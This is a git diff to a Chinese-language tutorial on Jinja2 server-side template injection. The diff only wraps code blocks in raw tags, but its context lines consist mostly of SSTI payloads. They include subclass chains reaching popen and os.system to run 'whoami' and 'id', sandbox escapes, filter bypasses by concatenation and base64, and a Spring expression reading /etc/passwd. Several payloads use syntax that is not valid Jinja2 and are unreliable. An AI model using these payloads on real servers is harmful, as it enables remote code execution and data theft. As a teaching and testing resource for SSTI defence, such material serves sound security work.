@@ -108,6 +108,7 @@ Jinja2是Python最流行的模板引擎，被Flask、Django（可选）等框架
 
 控制结构用于逻辑控制，也可能被用于执行恶意代码：
 
+{% raw %}
 ```jinja2
 {# 条件判断 #}
 {% if user.is_admin %}
@@ -127,15 +128,18 @@ Jinja2是Python最流行的模板引擎，被Flask、Django（可选）等框架
     <input type="text" name="{{ name }}" value="{{ value }}">
 {% endmacro %}
 ```
+{% endraw %}
 
 #### 注释 {# #}
 
 注释语法，可用于隐藏Payload：
 
+{% raw %}
 ```jinja2
 {# 这是注释，不会输出到页面 #}
 {{ 7*7 }}{# 探测Payload #}
 ```
+{% endraw %}
 
 #### 过滤器 |
 
@@ -418,15 +422,18 @@ template = env.from_string('{{ user_input }}')  # 受限执行
 
 **8. 使用namespace对象：**
 
+{% raw %}
 ```jinja2
 {# Python 3中的namespace对象 #}
 {% set ns = namespace() %}
 {% set ns.a = ''.__class__ %}
 {{ns.a}}
 ```
+{% endraw %}
 
 #### 各种绕过方法汇总
 
+{% raw %}
 ```jinja2
 {# === 方法1：基础利用链 === #}
 {{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('whoami').read()}}
@@ -475,6 +482,7 @@ template = env.from_string('{{ user_input }}')  # 受限执行
 {# === 方法15：使用bytes构造 === #}
 {{((b'').__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('whoami').read())}}
 ```
+{% endraw %}
 
 ---
 
@@ -836,19 +844,23 @@ server.serve_forever()
 
 **2. 利用code.InteractiveInterpreter**：
 
+{% raw %}
 ```jinja2
 {# 通过code模块执行交互式代码 #}
 {{ ''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['__import__']('code').InteractiveInterpreter().runsource('import os; os.system("id")') }}
 ```
+{% endraw %}
 
 **3. 利用types.FunctionType创建函数**：
 
+{% raw %}
 ```jinja2
 {# 利用FunctionType创建新函数 #}
 {% set ft = ''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('types').FunctionType %}
 {% set code = ''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['compile']('import os; os.system("id")', '', 'exec') %}
 {{ ft(code, {})() }}
 ```
+{% endraw %}
 
 **4. 利用BuiltinImporter加载模块**：
 
@@ -888,6 +900,7 @@ server.serve_forever()
 
 **9. 利用装饰器语法**：
 
+{% raw %}
 ```jinja2
 {# 利用装饰器执行代码 #}
 {% set dec = lambda f: f.__globals__.__builtins__.__import__('os').popen('id').read() %}
@@ -895,13 +908,16 @@ server.serve_forever()
 {% def test(): pass %}
 {% enddef %}
 ```
+{% endraw %}
 
 **10. 利用生成器表达式**：
 
+{% raw %}
 ```jinja2
 {# 利用生成器表达式 #}
 {{ (x for x in [__import__('os').popen('id').read()]).__next__() }}
 ```
+{% endraw %}
 
 #### Java沙箱逃逸
 
@@ -1015,6 +1031,7 @@ ${@org.springframework.util.ResourceUtils@getFile('file:///etc/passwd')}
 
 **1. 字符串拼接绕过**：
 
+{% raw %}
 ```jinja2
 {# 基础字符串拼接 #}
 {{()['__cl'+'ass__']}}
@@ -1037,6 +1054,7 @@ ${@org.springframework.util.ResourceUtils@getFile('file:///etc/passwd')}
 {% set b = 'lass__' %}
 {{()|attr(a+b)}}
 ```
+{% endraw %}
 
 **2. Unicode编码绕过**：
 
@@ -1067,6 +1085,7 @@ ${@org.springframework.util.ResourceUtils@getFile('file:///etc/passwd')}
 
 **4. Base64编码绕过**：
 
+{% raw %}
 ```jinja2
 {# 使用base64解码 #}
 {{()|attr(''.__class__([x for x in ''.__class__(['X19jbGFzc19f'], encoding='ascii').decode('base64')]))}}
@@ -1075,6 +1094,7 @@ ${@org.springframework.util.ResourceUtils@getFile('file:///etc/passwd')}
 {% set b64 = 'X19jbGFzc19f' %}
 {{()|attr(b64.decode('base64'))}}
 ```
+{% endraw %}
 
 #### 空格过滤绕过
 
